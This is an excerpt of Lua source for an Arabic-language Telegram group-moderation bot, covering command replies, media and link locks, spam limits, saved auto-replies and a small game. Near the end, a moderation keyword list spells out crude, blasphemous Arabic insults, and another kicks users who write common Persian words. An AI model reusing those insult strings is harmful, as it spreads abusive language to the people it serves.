Ali_Night(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
...
Ali_Night(msg.chat_id_,msg.id_, 1, "✯︙تم تفعيل جلب نسخة الكروبات التلقائيه\n✯︙سيتم ارسال نسخه تلقائيه للكروبات كل يوم الى خاص المطور الاساسي", 1, 'md')
AliNight:del(Night.."Abs:Lock:AutoFile")
end
...
Ali_Night(msg.chat_id_,msg.id_, 1, "✯︙تم تعطيل جلب نسخة الكروبات التلقائيه", 1, 'md')
AliNight:set(Night.."Abs:Lock:AutoFile",true) 
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "الابراج" or text == "↫ الابراج ✯" then  Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙من خلال البوت يمكنك معرفه توقعات برجك \n✯︙فقط قم بارسال امر برج + اسم البرج \n✯︙مثال : برج الاسد ،\n✯︙لمعرفه برجك قم بالرجوع الى قسم حساب العمر ', 1, 'md') end
if text == "حساب العمر" or text == "↫ حساب العمر ✯" then  Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙من خلال البوت يمكنك حساب عمرك \n✯︙فقط قم بارسال امر احسب + مواليدك الى البوت \n✯︙بالتنسيق التالي مثال : احسب 2000/7/24', 1, 'md') end
if text == "الحمايه" or text == "↫ الحمايه ✯" then  Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙اضف البوت في المجموعه ثم قم برفعه مشرف وارسل تفعيل \n✯︙وتمتع بخدمات غير موجوده في باقي البوتات ', 1, 'md') end
if text == "الزخرفه" or text == "↫ الزخرفه ✯" then  Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بأرسال أمر زخرفه وثم ارسال الاسم الذي تريد زخرفته بألانكليزي أو العربي', 1, 'md') end
...
if text == "معاني الاسماء" or text == "↫ معاني الاسماء ✯" then  Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙من خلال البوت يمكنك معرفه معنى اسمك \n✯︙فقط قم بارسال امر معنى اسم + الاسم \n✯︙مثال : معنى اسم ريو', 1, 'md') end
if text == "عدد المسح" or text == "تعين عدد المسح" or text == "تعيين عدد المسح" then  Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙فقط قم بارسال امر عدد المسح + عدد المسح \n✯︙مثال : عدد المسح 100', 1, 'md') end
if text == "انطق" then  Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙فقط قم بارسال امر انطق + الكلمه\n✯︙سيقوم البوت بنطق الكلمه \n✯︙مثال : انطق هلو', 1, 'md') end
if text == "ايديي" and ChCheck(msg) or text == "↫ ايديي ✯" and ChCheck(msg) then Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
-- Source Night --
if text == 'نبذا' and ChCheck(msg) or text == '↫ نبذا ✯' then
local NightTEAM = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
...
if DevText then
Ali_Night(msg.chat_id_, msg.id_,DevText)
else
...
Ali_Night(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
...
local my_ph = AliNight:get(Night.."Abs:Bio:Profile"..msg.chat_id_)
if not my_ph then
...
local my_ph = AliNight:get(Night.."Abs:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not AliNight:get(Night..'Abs:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*✯︙قائمه الالعاب المتطوره اضغط للعب*
]]
keyboard = {} 
...
{{text = '✯ Night TeaM .', url="t.me/sheserlo0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
if dp.id_ then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙المجموعه ↫ ["..dp.title_.."]\n✯︙تمت المغادره منها بنجاح", 1, "md")
Ali_Night(Text[2], 0, 1, "✯︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, Night)
AliNight:srem(Night.."Abs:Groups", dp.id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
...
AliNight:incr(Night..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
AliNight:set(Night.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = AliNight:get(Night.."Abs:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(Night) then 
AliNight:srem(Night.."Abs:Groups", msg.chat_id_) 
...
if AliNight:get(Night..'Abs:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
AliNight:incr(Night..'Abs:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
AliNight:incr(Night..'Abs:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not AliNight:get(Night..'Abs:Lock:FreeBot'..Night) then
if ChatType == 'pv' then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
...
for i=0 , #admins do
if Abs.members_[i].bot_info_ == false and Abs.members_[i].status_.ID == "ChatMemberStatusEditor" then
AliNight:sadd(Night..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
AliNight:srem(Night..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
AliNight:sadd(Night..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
...
if Abs.members_[i].status_.ID == "ChatMemberStatusCreator" then
AliNight:sadd(Night.."Abs:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
AliNight:sadd(Night.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
AliNight:srem(Night.."Abs:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
AliNight:srem(Night.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(AliNight:get(Night..'Abs:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙عدد اعضاء المجموعه اقل من ↫ *'..(AliNight:get(Night..'Abs:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","✯︙تم تفعيل المجموعه "..dp.title_)  
AliNight:sadd(Night.."Abs:Groups",msg.chat_id_)
AliNight:sadd(Night..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
AliNight:set(Night.."Abs:Groups:Links"..msg.chat_id_,LinkGroup) 
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if not Bot(msg) then 
local filter = AliNight:smembers(Night.."Abs:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = AliNight:smembers(Night.."Abs:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = AliNight:smembers(Night.."Abs:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
if text and text:match("^(.*)$") then
local DelAllRed = AliNight:get(Night.."Abs:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
AliNight:del(Night.."Abs:Add:AllRed"..msg.sender_user_id_)
AliNight:del(Night.."Abs:Gif:AllRed"..msg.content_.text_)
AliNight:del(Night.."Abs:Voice:AllRed"..msg.content_.text_)
AliNight:del(Night.."Abs:Audio:AllRed"..msg.content_.text_)
AliNight:del(Night.."Abs:Photo:AllRed"..msg.content_.text_)
AliNight:del(Night.."Abs:Stecker:AllRed"..msg.content_.text_)
AliNight:del(Night.."Abs:Video:AllRed"..msg.content_.text_)
AliNight:del(Night.."Abs:File:AllRed"..msg.content_.text_)
AliNight:del(Night.."Abs:Text:AllRed"..msg.content_.text_)
AliNight:del(Night.."Abs:Sudo:AllRed",msg.content_.text_)
return false
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^(.*)$") then
local SaveKt = AliNight:get(Night..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SaveKt == 'SaveKt' then
local GetKtTexts = AliNight:get(Night..'Abs:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
local List = AliNight:smembers(Night..'Abs:Text:KtTexts'..GetKtTexts..msg.chat_id_)
if text == "الغاء" then 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙✯︙تم الغاء عملية حفظ اسئلة الكت  ↫ "..GetKtTexts ,  1, "md")
AliNight:del(Night..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
AliNight:del(Night..'Abs:Text:KtTexts'..GetKtTexts..msg.chat_id_)
AliNight:del(Night..'Abs:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
AliNight:srem(Night..'Abs:Sudo:Kt'..msg.chat_id_,GetKtTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
AliNight:sadd(Night..'Abs:Text:KtTexts'..GetKtTexts..msg.chat_id_,Text)
if #List == 100 then 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حفظ ↫ 100 من اسئلة الكت ↫ "..GetKtTexts ,  1, "md")
AliNight:del(Night..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
return false
end
...
if text and not AliNight:get(Night..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_) then
if AliNight:sismember(Night..'Abs:Sudo:Kt'..msg.chat_id_,text) then
local NightTEAM =  AliNight:smembers(Night..'Abs:Text:KtTexts'..text..msg.chat_id_)
Ali_Night(msg.chat_id_, msg.id_, 1, '['..NightTEAM[math.random(#NightTEAM)]..']' , 1, 'md')  
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = AliNight:get(Night.."Abs:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = AliNight:get(Night..'DelSudoRep')
AliNight:del(Night.."Abs:Sudo:AllRed",DelSudoRep)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء حفظ الرد', 1, 'md')
AliNight:del(Night.."Abs:Add:AllText"..msg.sender_user_id_)
AliNight:del(Night.."Abs:Add:AllRed"..msg.sender_user_id_)
AliNight:del(Night.."DelSudoRep")
return false
end
AliNight:del(Night.."Abs:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = AliNight:get(Night.."Abs:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
AliNight:set(Night.."Abs:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
AliNight:set(Night.."Abs:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
AliNight:set(Night.."Abs:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
AliNight:set(Night.."Abs:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
AliNight:set(Night.."Abs:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
AliNight:set(Night.."Abs:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
AliNight:set(Night.."Abs:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
AliNight:set(Night.."Abs:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حفظ الرد الجديد', 1, 'md') 
AliNight:del(Night.."Abs:Add:AllText"..msg.sender_user_id_)
AliNight:del(Night..'DelSudoRep')
return false end end
if msg.content_.text_ and not AliNight:get(Night..'Abs:Lock:AllRed'..msg.chat_id_) then
if AliNight:get(Night.."Abs:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, AliNight:get(Night.."Abs:Video:AllRed"..msg.content_.text_))
end
if AliNight:get(Night.."Abs:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, AliNight:get(Night.."Abs:File:AllRed"..msg.content_.text_))
end
if AliNight:get(Night.."Abs:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, AliNight:get(Night.."Abs:Voice:AllRed"..msg.content_.text_))
end
if AliNight:get(Night.."Abs:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, AliNight:get(Night.."Abs:Audio:AllRed"..msg.content_.text_))
end
if AliNight:get(Night.."Abs:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, AliNight:get(Night.."Abs:Photo:AllRed"..msg.content_.text_))
end
if  AliNight:get(Night.."Abs:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, AliNight:get(Night.."Abs:Gif:AllRed"..msg.content_.text_))
end
if AliNight:get(Night.."Abs:Stecker:AllRed"..msg.content_.text_) then
...
local edit_msg = AliNight:get(Night..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = AliNight:get(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = AliNight:get(Night.."Abs:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "mute" and not AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_, msg.sender_user_id_) then
AliNight:sadd(Night..'Abs:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= Night then
floods = AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(AliNight:get(Night.."Abs:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
AliNight:setex(Night.."Abs:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(Night) then
AliNight:set(Night..'Abs:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = AliNight:get(Night..'Abs:PinnedMsg'..msg.chat_id_)
if pin_id and AliNight:get(Night..'Abs:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if AliNight:get(Night..'Abs:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
AliNight:del(Night..'Abs:viewget'..msg.sender_user_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
AliNight:del(Night..'Abs:viewget'..msg.sender_user_id_)
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if AliNight:get(Night..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if AliNight:get(Night..'Abs:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if AliNight:get(Night..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if AliNight:get(Night..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if AliNight:get(Night..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if AliNight:get(Night..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if AliNight:get(Night..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if AliNight:get(Night..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if AliNight:get(Night..'Abs:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if AliNight:get(Night..'Abs:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if AliNight:get(Night..'Abs:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if AliNight:get(Night..'Abs:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@sheserlo0]'))
...
if not AliNight:get(Night..'Abs:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Night,offset_ = 0,limit_ = 1},function(extra,Abs,success) 
...
if AliNight:get(Night.."Abs:Photo:BotWelcome") then AbsPhoto = AliNight:get(Night.."Abs:Photo:BotWelcome") elseif Abs.photos_[0] then AbsPhoto = Abs.photos_[0].sizes_[1].photo_.persistent_id_ else AbsPhoto = nil end 
...
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@sheserlo0]'))
Ali_Night(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
--        Contact         --
...
if AliNight:get(Night..'Abs:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if AliNight:get(Night..'Abs:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if AliNight:get(Night..'Abs:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if AliNight:get(Night..'Abs:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if AliNight:get(Night..'Abs:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if AliNight:get(Night..'Abs:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if AliNight:get(Night..'Abs:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not AliNight:get(Night..'Abs:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(AliNight:get(Night..'Abs:Spam:Text'..msg.chat_id_))
end
if AliNight:get(Night..'Abs:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if AliNight:get(Night.."Abs:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not AliNight:get(Night.."Abs:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not AliNight:get(Night.."Abs:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
Managers = AliNight:smembers(Night..'Abs:Managers:'..v)
Admis = AliNight:smembers(Night..'Abs:Admins:'..v)
Vips = AliNight:smembers(Night..'Abs:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
GetJson = GetJson..'}}'
local File = io.open('./'..Night..'.json', "w")
File:write(GetJson)
File:close()
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if AliNight:get(Night.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Ali_Night( msg.chat_id_, msg.id_, 1,"✯︙يوجد فقط ( 6 ) اختيارات\n✯︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = AliNight:get(Night.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
AliNight:del(Night.."SET:GAME"..msg.chat_id_)   
Ali_Night( msg.chat_id_, msg.id_, 1,'✯︙*المحيبس باليد رقم* ↫ '..NUM..'\n✯︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
AliNight:incrby(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
AliNight:del(Night.."SET:GAME"..msg.chat_id_)   
Ali_Night( msg.chat_id_, msg.id_, 1,'✯︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n✯︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if AliNight:get(Night..'AliNight4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "✯︙تم الغاء الامر")
AliNight:del(Night..'AliNight4'..msg.sender_user_id_)
return false  end 
AliNight:del(Night..'AliNight4'..msg.sender_user_id_)
...
if AliNight:get(Night..'Abs:NameBot'..msg.sender_user_id_) == 'msg' then
